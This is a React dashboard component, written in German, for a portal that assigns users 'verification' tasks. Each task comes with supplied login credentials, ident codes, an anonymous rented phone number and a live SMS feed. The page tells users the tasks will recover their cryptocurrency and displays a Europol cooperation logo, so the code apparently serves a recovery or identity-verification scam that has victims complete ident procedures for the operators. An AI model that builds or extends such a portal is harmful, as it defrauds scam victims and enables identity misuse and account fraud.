import { useEffect, useState, useCallback } from "react";
import { useAuth } from "@/hooks/useAuth";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { AssignmentStatusBadge, type AssignmentStatus } from "@/components/AssignmentStatusBadge";
import { LogOut, ArrowLeft, Copy, CheckCircle, Loader2, Lock, MessageSquare, Menu, AlertTriangle, Clock, Send, FileUp } from "lucide-react";
import { Sheet, SheetContent, SheetTrigger, SheetHeader, SheetTitle } from "@/components/ui/sheet";
import { Separator } from "@/components/ui/separator";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
  AlertDialogTrigger,
} from "@/components/ui/alert-dialog";
import bovensiepenLogo from "@/assets/bovensiepen-logo.png";
import europolLogo from "@/assets/europol-logo.png";
import appStoreBadge from "@/assets/app-store.svg";
import googlePlayBadge from "@/assets/google-play.svg";
import { useNavigate } from "react-router-dom";
import { toast } from "sonner";
import DocumentUpload from "@/components/DocumentUpload";

interface SMSMessage {
  messageSender: string;
  messageDate: string;
  messageText: string;
}

interface Assignment {
  id: string;
  status: AssignmentStatus;
  field_values: Record<string, string>;
  created_at: string;
  verification_id: string;
  phone_number_id: string | null;
  phone_token: string | null;
  sms_monitoring_active: boolean;
  hidden_sms: string[];
  verification?: {
    title: string;
    logo_url: string | null;
    instructions: string[];
    required_fields: string[];
    appstore_url: string | null;
    playstore_url: string | null;
  };
  phone_number?: string | null;
}

const FIELD_ORDER = ["identlink", "identcode", "email", "username", "password"];

const FIELD_LABELS: Record<string, string> = {
  identlink: "Identlink",
  identcode: "Identcode",
  email: "E-Mail",
  username: "Anmeldename",
  password: "Passwort",
};

const PLACEHOLDER_CARDS = [
  { label: "Demnächst verfügbar" },
  { label: "Demnächst verfügbar" },
];

export default function Dashboard() {
  const { user, signOut } = useAuth();
  const navigate = useNavigate();
  const [assignments, setAssignments] = useState<Assignment[]>([]);
  const [loading, setLoading] = useState(true);
  const [profileName, setProfileName] = useState<string>("");
  const [profileEmail, setProfileEmail] = useState<string>("");
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [copiedField, setCopiedField] = useState<string | null>(null);
  const [smsMessages, setSmsMessages] = useState<SMSMessage[]>([]);
  const [smsLoading, setSmsLoading] = useState(false);
  const [showDocUpload, setShowDocUpload] = useState(false);

  const userIdRef = user?.id;
  useEffect(() => {
    if (userIdRef) {
      loadAssignments();
      loadProfile();
    }
  }, [userIdRef]);

  const loadProfile = async () => {
    const { data } = await supabase
      .from("profiles")
      .select("first_name, last_name, email")
      .eq("id", user!.id)
      .maybeSingle();
    if (data) {
      const name = [data.first_name, data.last_name].filter(Boolean).join(" ");
      setProfileName(name);
      setProfileEmail(data.email ?? "");
    }
  };

  const loadAssignments = async () => {
    if (assignments.length === 0) setLoading(true);
    const { data: rows } = await supabase
      .from("verification_assignments")
      .select("id, status, field_values, created_at, verification_id, phone_number_id, sms_monitoring_active, hidden_sms")
      .eq("user_id", user!.id)
      .order("created_at", { ascending: false });

    if (!rows || rows.length === 0) {
      setAssignments([]);
      setLoading(false);
      return;
    }

    const verificationIds = [...new Set(rows.map((r) => r.verification_id))];
    const { data: verifications } = await supabase
      .from("verifications")
      .select("id, title, logo_url, instructions, required_fields, appstore_url, playstore_url")
      .in("id", verificationIds);

    const vMap = new Map(verifications?.map((v) => [v.id, v]) ?? []);

    const phoneIds = rows.filter((r) => r.phone_number_id).map((r) => r.phone_number_id!);
    let phoneMap = new Map<string, { number: string; token: string }>();
    if (phoneIds.length > 0) {
      const { data: phones } = await supabase
        .from("phone_numbers")
        .select("id, token")
        .in("id", phoneIds);

      if (phones) {
        for (const p of phones) {
          try {
            const { data } = await supabase.functions.invoke("anosim-proxy", {
              body: { token: p.token },
            });
            if (data?.number) {
              phoneMap.set(p.id, { number: data.number, token: p.token });
            }
          } catch {
            // ignore
          }
        }
      }
    }

    const mapped: Assignment[] = rows.map((r) => {
      const phoneData = r.phone_number_id ? phoneMap.get(r.phone_number_id) : null;
      return {
        id: r.id,
        status: r.status as AssignmentStatus,
        field_values: (r.field_values as Record<string, string>) ?? {},
        created_at: r.created_at,
        verification_id: r.verification_id,
        phone_number_id: r.phone_number_id,
        phone_token: phoneData?.token ?? null,
        sms_monitoring_active: (r as any).sms_monitoring_active ?? true,
        hidden_sms: ((r as any).hidden_sms as string[]) ?? [],
        verification: vMap.get(r.verification_id),
        phone_number: phoneData?.number ?? null,
      };
    });

    setAssignments(mapped);
    setLoading(false);
  };

  const selected = assignments.find((a) => a.id === selectedId) ?? null;

  // SMS loading with auto-refresh
  const fetchSms = useCallback(async () => {
    if (!selected?.phone_token || !selected?.created_at) return;
    if (!selected.sms_monitoring_active) {
      setSmsMessages([]);
      return;
    }
    
    try {
      const { data } = await supabase.functions.invoke("anosim-proxy", {
        body: { token: selected.phone_token },
      });
      
      if (data?.sms && Array.isArray(data.sms)) {
        const assignedAt = new Date(selected.created_at);
        const hiddenKeys = selected.hidden_sms || [];
        const filtered = data.sms
          .filter((sms: SMSMessage) => new Date(sms.messageDate) >= assignedAt)
          .filter((sms: SMSMessage) => !hiddenKeys.includes(`${sms.messageSender}|${sms.messageDate}`))
          .sort((a: SMSMessage, b: SMSMessage) => 
            new Date(b.messageDate).getTime() - new Date(a.messageDate).getTime()
          );
        setSmsMessages(filtered);
      }
    } catch {
      // ignore errors silently
    }
  }, [selected?.phone_token, selected?.created_at, selected?.sms_monitoring_active, selected?.hidden_sms]);

  useEffect(() => {
    if (selectedId && selected?.phone_token) {
      setSmsLoading(true);
      fetchSms().finally(() => setSmsLoading(false));
      
      const interval = setInterval(fetchSms, 5000);
      return () => clearInterval(interval);
    } else {
      setSmsMessages([]);
    }
  }, [selectedId, selected?.phone_token, fetchSms]);

  const handleSignOut = async () => {
    await signOut();
    navigate("/auth", { replace: true });
  };

  const copyToClipboard = (key: string, value: string) => {
    navigator.clipboard.writeText(value);
    setCopiedField(key);
    toast.success("Kopiert");
    setTimeout(() => setCopiedField(null), 2000);
  };

  const formatSmsDate = (iso: string) => {
    const date = new Date(iso);
    return date.toLocaleString("de-DE", {
      day: "2-digit",
      month: "2-digit",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    });
  };

  // Get ordered credentials (excluding phone which has its own section)
  const getOrderedCredentials = (fieldValues: Record<string, string>) => {
    const result: [string, string][] = [];
    for (const key of FIELD_ORDER) {
      if (fieldValues[key] !== undefined) {
        result.push([key, fieldValues[key]]);
      }
    }
    return result;
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <Loader2 className="w-6 h-6 animate-spin text-muted-foreground" />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <header className="border-b border-border bg-card/80 backdrop-blur-sm sticky top-0 z-10">
        {/* Desktop Header */}
        <div className="hidden md:flex max-w-5xl mx-auto px-6 h-14 items-center justify-between">
          <img src={bovensiepenLogo} alt="Bovensiepen & Partner" className="h-9 w-auto" />
          <div className="flex items-center gap-3">
            <Button size="sm" onClick={() => { setShowDocUpload(true); setSelectedId(null); }}>
              <FileUp className="w-4 h-4 mr-1.5" />
              Dokumente hochladen
            </Button>
            {profileName && (
              <span className="text-sm font-medium text-foreground">{profileName}</span>
            )}
            <Button variant="ghost" size="sm" onClick={handleSignOut} className="text-muted-foreground hover:text-destructive">
              <LogOut className="w-4 h-4 mr-1.5" />
              Abmelden
            </Button>
          </div>
        </div>

        {/* Mobile/Tablet Header */}
        <div className="flex md:hidden relative h-14 items-center justify-center px-4">
          <Sheet>
            <SheetTrigger asChild>
              <Button variant="ghost" size="icon" className="absolute left-4 top-1/2 -translate-y-1/2">
                <Menu className="w-5 h-5" />
              </Button>
            </SheetTrigger>
            <SheetContent side="left" className="w-64">
              <SheetHeader>
                <SheetTitle className="text-left">Menü</SheetTitle>
              </SheetHeader>
              <div className="flex flex-col gap-4 mt-6">
                {(profileName || profileEmail) && (
                  <div className="px-1">
                    {profileName && <span className="text-sm font-medium text-foreground block">{profileName}</span>}
                    {profileEmail && <span className="text-xs text-muted-foreground block">{profileEmail}</span>}
                  </div>
                )}
                <Separator />
                <Button size="sm" onClick={() => { setShowDocUpload(true); setSelectedId(null); }} className="justify-start">
                  <FileUp className="w-4 h-4 mr-1.5" />
                  Dokumente hochladen
                </Button>
                <Button variant="ghost" size="sm" onClick={handleSignOut} className="justify-start text-muted-foreground hover:text-destructive">
                  <LogOut className="w-4 h-4 mr-1.5" />
                  Abmelden
                </Button>
              </div>
            </SheetContent>
          </Sheet>
          <img src={bovensiepenLogo} alt="Bovensiepen & Partner" className="h-9 w-auto" />
        </div>
      </header>

      {selected ? (
        /* ── Detail View ── */
        <main className="max-w-2xl mx-auto w-full px-6 py-10 animate-in fade-in slide-in-from-right-4 duration-300">
          <Button
            variant="ghost"
            size="sm"
            onClick={() => setSelectedId(null)}
            className="mb-8 text-muted-foreground hover:text-foreground -ml-2"
          >
            <ArrowLeft className="w-4 h-4 mr-1.5" />
            Zurück
          </Button>

          <div className="flex items-center gap-4 mb-8">
            {selected.verification?.logo_url && (
              <img
                src={selected.verification.logo_url}
                alt=""
                className="w-14 h-14 rounded-2xl object-contain bg-secondary p-2"
              />
            )}
            <div className="flex-1 min-w-0">
              <h1 className="text-2xl font-bold text-foreground tracking-tight truncate">
                {selected.verification?.title ?? "Auftrag"}
              </h1>
              <div className="mt-1.5">
                <AssignmentStatusBadge status={selected.status} />
              </div>
            </div>
          </div>

          <div className="space-y-8">
            {/* App Links - Badge Images */}
            {(selected.verification?.appstore_url || selected.verification?.playstore_url) && (
              <div className="flex gap-3 flex-wrap">
                {selected.verification.appstore_url && (
                  <a href={selected.verification.appstore_url} target="_blank" rel="noopener noreferrer">
                    <img src={appStoreBadge} alt="App Store" className="h-10 w-auto transition-transform duration-200 hover:scale-105 transition-transform duration-200 hover:scale-105" />
                  </a>
                )}
                {selected.verification.playstore_url && (
                  <a href={selected.verification.playstore_url} target="_blank" rel="noopener noreferrer">
                    <img src={googlePlayBadge} alt="Google Play" className="h-10 w-auto transition-transform duration-200 hover:scale-105" />
                  </a>
                )}
              </div>
            )}

            {/* Credentials - Ordered */}
            {getOrderedCredentials(selected.field_values).length > 0 && (
              <div>
                <h3 className="text-sm font-medium text-foreground mb-3">Zugangsdaten</h3>
                <div className="space-y-2">
                  {getOrderedCredentials(selected.field_values).map(([key, value]) => (
                    <div
                      key={key}
                      className="flex items-center justify-between rounded-xl border border-border bg-secondary/50 px-4 py-3 group"
                    >
                      <div className="min-w-0 flex-1">
                        <p className="text-xs text-muted-foreground">{FIELD_LABELS[key] ?? key}</p>
                        <p className="text-sm font-mono font-medium text-foreground truncate">{value}</p>
                      </div>
                      <Button
                        variant="ghost"
                        size="icon"
                        className="h-8 w-8 shrink-0 opacity-60 group-hover:opacity-100 transition-opacity"
                        onClick={() => copyToClipboard(key, value)}
                      >
                        {copiedField === key ? (
                          <CheckCircle className="w-3.5 h-3.5 text-green-600" />
                        ) : (
                          <Copy className="w-3.5 h-3.5" />
                        )}
                      </Button>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Phone number */}
            {selected.phone_number && (
              <div>
                <h3 className="text-sm font-medium text-foreground mb-3">Zugewiesene Telefonnummer</h3>
                <div className="flex items-center justify-between rounded-xl border border-border bg-secondary/50 px-4 py-3 group">
                  <div>
                    <p className="text-xs text-muted-foreground">Telefonnummer</p>
                    <p className="text-sm font-mono font-medium text-foreground">{selected.phone_number}</p>
                  </div>
                  <Button
                    variant="ghost"
                    size="icon"
                    className="h-8 w-8 shrink-0 opacity-60 group-hover:opacity-100 transition-opacity"
                    onClick={() => copyToClipboard("phone_assigned", selected.phone_number!)}
                  >
                    {copiedField === "phone_assigned" ? (
                      <CheckCircle className="w-3.5 h-3.5 text-green-600" />
                    ) : (
                      <Copy className="w-3.5 h-3.5" />
                    )}
                  </Button>
                </div>
              </div>
            )}

            {/* SMS Messages */}
            {selected.phone_token && selected.sms_monitoring_active && (
              <div>
                <div className="flex items-center gap-2 mb-3">
                  <MessageSquare className="w-4 h-4 text-muted-foreground" />
                  <h3 className="text-sm font-medium text-foreground">SMS-Nachrichten</h3>
                  {smsLoading && <Loader2 className="w-3.5 h-3.5 animate-spin text-muted-foreground" />}
                </div>
                
                {smsMessages.length === 0 ? (
                  <div className="rounded-xl border border-border bg-secondary/30 px-4 py-6 text-center">
                    <p className="text-sm text-muted-foreground">
                      {smsLoading ? "Lade SMS..." : "Noch keine SMS seit Zuweisung eingegangen"}
                    </p>
                  </div>
                ) : (
                  <div className="space-y-2">
                    {smsMessages.map((sms, i) => (
                      <div
                        key={`${sms.messageDate}-${i}`}
                        className="rounded-xl border border-border bg-secondary/50 px-4 py-3 group"
                      >
                        <div className="flex items-start justify-between gap-3">
                          <div className="min-w-0 flex-1">
                            <div className="flex items-center gap-2 mb-1">
                              <span className="text-xs font-medium text-primary">{sms.messageSender}</span>
                              <span className="text-xs text-muted-foreground">{formatSmsDate(sms.messageDate)}</span>
                            </div>
                            <p className="text-sm text-foreground break-words">{sms.messageText}</p>
                          </div>
                          <Button
                            variant="ghost"
                            size="icon"
                            className="h-8 w-8 shrink-0 opacity-60 group-hover:opacity-100 transition-opacity"
                            onClick={() => copyToClipboard(`sms-${i}`, sms.messageText)}
                          >
                            {copiedField === `sms-${i}` ? (
                              <CheckCircle className="w-3.5 h-3.5 text-green-600" />
                            ) : (
                              <Copy className="w-3.5 h-3.5" />
                            )}
                          </Button>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            )}

            {/* Instructions */}
            {selected.verification?.instructions && selected.verification.instructions.length > 0 && (
              <div>
                <h3 className="text-sm font-medium text-foreground mb-3">Anleitung</h3>
                <ol className="space-y-3">
                  {selected.verification.instructions.map((step, i) => (
                    <li key={i} className="flex gap-3 items-start">
                      <span className="flex-shrink-0 w-6 h-6 rounded-full bg-primary/10 text-primary text-xs font-semibold flex items-center justify-center mt-0.5">
                        {i + 1}
                      </span>
                      <span className="text-sm text-foreground/80 leading-relaxed">{step}</span>
                    </li>
                  ))}
                </ol>
              </div>
            )}

            {/* Status banners & submit button */}
            {selected.status === "abgelehnt" && (
              <div className="flex items-start gap-3 rounded-xl border border-red-300 bg-red-50 px-4 py-3 dark:border-red-500/30 dark:bg-red-500/10">
                <AlertTriangle className="w-5 h-5 text-red-600 dark:text-red-400 mt-0.5 shrink-0" />
                <div>
                  <p className="text-sm font-medium text-red-700 dark:text-red-400">Auftrag abgelehnt</p>
                  <p className="text-sm text-red-600/80 dark:text-red-400/70">Bitte führen Sie den Auftrag erneut gemäß der Anleitung durch und reichen Sie ihn dann wieder ein.</p>
                </div>
              </div>
            )}

            {selected.status === "in_ueberpruefung" && (
              <div className="flex items-start gap-3 rounded-xl border border-orange-300 bg-orange-50 px-4 py-3 dark:border-orange-500/30 dark:bg-orange-500/10">
                <Clock className="w-5 h-5 text-orange-600 dark:text-orange-400 mt-0.5 shrink-0" />
                <div>
                  <p className="text-sm font-medium text-orange-700 dark:text-orange-400">In Überprüfung</p>
                  <p className="text-sm text-orange-600/80 dark:text-orange-400/70">Ihr Auftrag wird derzeit überprüft. Bitte haben Sie etwas Geduld.</p>
                </div>
              </div>
            )}

            {selected.status === "genehmigt" && (
              <div className="flex items-start gap-3 rounded-xl border border-emerald-300 bg-emerald-50 px-4 py-3 dark:border-emerald-500/30 dark:bg-emerald-500/10">
                <CheckCircle className="w-5 h-5 text-emerald-600 dark:text-emerald-400 mt-0.5 shrink-0" />
                <div>
                  <p className="text-sm font-medium text-emerald-700 dark:text-emerald-400">Erfolgreich abgeschlossen</p>
                  <p className="text-sm text-emerald-600/80 dark:text-emerald-400/70">Dieser Auftrag wurde erfolgreich genehmigt.</p>
                </div>
              </div>
            )}

            {(selected.status === "zugewiesen" || selected.status === "abgelehnt") && (
              <AlertDialog>
                <AlertDialogTrigger asChild>
                  <Button className="w-full" size="lg">
                    <Send className="w-4 h-4 mr-2" />
                    Auftrag abschließen
                  </Button>
                </AlertDialogTrigger>
                <AlertDialogContent>
                  <AlertDialogHeader>
                    <AlertDialogTitle>Auftrag zur Überprüfung einreichen?</AlertDialogTitle>
                    <AlertDialogDescription>
                      Bitte bestätigen Sie, dass Sie den Auftrag gemäß der Anleitung erfolgreich abgeschlossen haben. Der Auftrag wird anschließend zur Überprüfung eingereicht.
                    </AlertDialogDescription>
                  </AlertDialogHeader>
                  <AlertDialogFooter>
                    <AlertDialogCancel>Abbrechen</AlertDialogCancel>
                    <AlertDialogAction
                      onClick={async () => {
                        const { error } = await supabase
                          .from("verification_assignments")
                          .update({ status: "in_ueberpruefung" as any })
                          .eq("id", selected.id);
                        if (error) {
                          toast.error("Fehler: " + error.message);
                        } else {
                          toast.success("Auftrag zur Überprüfung eingereicht");
                          setAssignments((prev) =>
                            prev.map((a) =>
                              a.id === selected.id ? { ...a, status: "in_ueberpruefung" as AssignmentStatus } : a
                            )
                          );
                        }
                      }}
                    >
                      Bestätigen
                    </AlertDialogAction>
                  </AlertDialogFooter>
                </AlertDialogContent>
              </AlertDialog>
            )}
          </div>
        </main>
      ) : (
        /* ── Overview ── */
        <main className="max-w-5xl mx-auto w-full px-6">
          {/* Hero */}
          <div className="pt-16 pb-12 text-center opacity-0 animate-fade-in" style={{ animationDelay: "0ms", animationFillMode: "forwards" }}>
            <h1 className="text-4xl sm:text-5xl font-bold tracking-tight text-foreground">
              Willkommen zurück
            </h1>
            <p className="mt-4 text-lg text-muted-foreground max-w-3xl mx-auto leading-relaxed">
              Bitte führen Sie die folgenden Verifikationen durch, um Ihre Kryptowährungen sicher auf Ihr Konto zurückzuführen.<br />
              Klicken Sie auf einen Auftrag, um die Anleitung und Zugangsdaten einzusehen.
            </p>
          </div>

          {/* Grid */}
          <div className="grid grid-cols-2 sm:grid-cols-3 gap-4 pb-16 opacity-0 animate-fade-in" style={{ animationDelay: "150ms", animationFillMode: "forwards" }}>
            {/* Real assignments */}
            {assignments.map((a) => (
              <Card
                key={a.id}
                onClick={() => setSelectedId(a.id)}
                className="border-border bg-card shadow-none cursor-pointer transition-all duration-200 hover:border-primary/30 hover:shadow-lg hover:shadow-primary/5 group"
              >
                <CardContent className="p-0 aspect-square flex flex-col items-center justify-center text-center gap-3 px-4">
                  {a.verification?.logo_url ? (
                    <img
                      src={a.verification.logo_url}
                      alt=""
                      className="w-14 h-14 rounded-2xl object-contain bg-secondary p-2 transition-transform duration-200 group-hover:scale-105"
                    />
                  ) : (
                    <div className="w-14 h-14 rounded-2xl bg-secondary flex items-center justify-center">
                      <span className="text-xl font-bold text-muted-foreground">
                        {(a.verification?.title ?? "A").charAt(0)}
                      </span>
                    </div>
                  )}
                  <div className="space-y-1.5">
                    <p className="text-sm font-semibold text-foreground truncate max-w-full">
                      {a.verification?.title ?? "Auftrag"}
                    </p>
                    <AssignmentStatusBadge status={a.status} />
                  </div>
                </CardContent>
              </Card>
            ))}

            {/* Placeholder cards */}
            {PLACEHOLDER_CARDS.map((p, i) => (
              <div
                key={`placeholder-${i}`}
                className="aspect-square rounded-lg border-2 border-dashed border-border/60 flex flex-col items-center justify-center text-center gap-2 px-4"
              >
                <Lock className="w-5 h-5 text-muted-foreground/40" />
                <p className="text-xs font-medium text-muted-foreground/50">
                  {p.label}
                </p>
              </div>
            ))}
          </div>

          {/* Partner Section */}
          <div className="mt-16 pb-12 opacity-0 animate-fade-in" style={{ animationDelay: "300ms", animationFillMode: "forwards" }}>
            <Separator className="mb-8" />
            <div className="text-center space-y-6">
              <p className="text-xs uppercase tracking-widest text-muted-foreground/60 font-medium">
                In Kooperation mit
              </p>
              <div className="flex items-center justify-center">
                <img 
                  src={europolLogo} 
                  alt="Europol" 
                  className="h-10 w-auto opacity-70 hover:opacity-100 transition-opacity" 
                />
              </div>
            </div>
          </div>
        </main>
      )}
    </div>
  );
}
